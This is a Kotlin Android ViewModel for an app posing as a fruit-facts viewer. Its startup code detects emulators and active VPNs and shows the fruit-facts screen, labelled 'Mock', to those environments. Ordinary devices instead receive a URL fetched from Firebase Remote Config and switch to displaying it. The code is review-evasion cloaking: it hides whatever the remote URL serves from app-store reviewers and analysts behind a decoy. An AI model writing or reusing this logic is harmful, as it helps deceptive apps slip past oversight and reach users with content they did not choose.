package facts.fruit.ui

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dagger.hilt.android.lifecycle.HiltViewModel
import facts.fruit.data.factsFriuts
import facts.fruit.domain.Keeper
import facts.fruit.domain.Service
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class MainViewModel @Inject constructor(
    private val service: Service,
    private val keeper: Keeper.Keeper
) : ViewModel() {
    private val _state = MutableStateFlow(MainState())
    val state = _state.asStateFlow()

    private val _nextNumberItem = MutableStateFlow(0)

    init {
        getFromLocal()
    }

    private fun getFromLocal() {
        if (service.checkIsEmu()) {
            game()
        } else {
            val pathUrl = keeper.getSharedUrl()
            val sharedTo = keeper.getSharedTo()
            if (pathUrl.isNullOrEmpty()) {
                getRemoteData()
            } else {
                setStatusByChecking(
                    url = pathUrl,
                    isCheckVpn = sharedTo
                )
            }
        }
    }

    private fun getRemoteData() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(3600)
            .build()
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener { p0 ->
                if (p0.isSuccessful) {
                    val isCheckedVpn = remoteConfig.getBoolean("to")
                    val resultUrl = remoteConfig.getString("url")
                    keeper.setSharedUrl(url = resultUrl)
                    keeper.setSharedTo(isCheckedVpn)
                    setStatusByChecking(
                        url = resultUrl,
                        isCheckVpn = isCheckedVpn
                    )
                } else {
                    game()
                }
            }
    }


    private fun setStatusByChecking(url: String, isCheckVpn: Boolean) {
        if (isCheckVpn) {
            if (service.checkIsEmu() || url == "" || service.vpnActive()) {
                game()
            } else {
                _state.value.copy(
                    status = ApplicationStatus.Succsess(url = url)
                )
                    .updateStateUI()

            }
        } else {
            viewModelScope.launch {
                if (service.checkIsEmu() || url == "") {
                    game()
                } else {
                    _state.value.copy(
                        status = ApplicationStatus.Succsess(url = url)
                    )
                        .updateStateUI()

                }
            }
        }
    }

    fun nextFact() {
        val currentNumber = _nextNumberItem.value
        if (currentNumber < factsFriuts.size - 1) {
            _nextNumberItem.value = currentNumber + 1
        } else _nextNumberItem.value = 0
        _state.value.copy(
            fruit = factsFriuts[_nextNumberItem.value]
        )
            .updateStateUI()
    }

    private fun game() {

        _state.value.copy(
            status = ApplicationStatus.Mock
        )
            .updateStateUI()
    }

    private fun MainState.updateStateUI() {
        _state.update {
            this
        }
    }
}